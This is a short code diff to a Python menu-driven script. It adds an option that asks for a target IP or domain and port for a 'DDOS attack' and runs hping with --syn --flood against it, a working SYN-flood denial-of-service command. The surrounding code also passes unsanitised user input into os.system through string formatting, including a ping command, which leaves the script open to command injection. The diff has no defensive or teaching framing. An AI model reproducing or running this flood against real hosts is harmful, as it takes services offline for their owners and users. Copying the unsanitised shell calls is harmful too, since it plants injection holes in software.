@@ -27,9 +27,15 @@ while True:
         system("ping {p}".format(
             p = ping_
             ))
-    elif choice == 5:
-        pass
-    elif choice == 6:
-        pass
+    elif choice == "5":
+        ip = input("ip or domain name of the target for the DDOS attack: ")
+        port = input("port of the target: ")
+        system("hping --syn -p {port} --flood {ip}".format(
+            port = port,
+            ip = ip
+            ))
+    elif choice == "6":
+        system("elinks")
+
 
 exit(0)
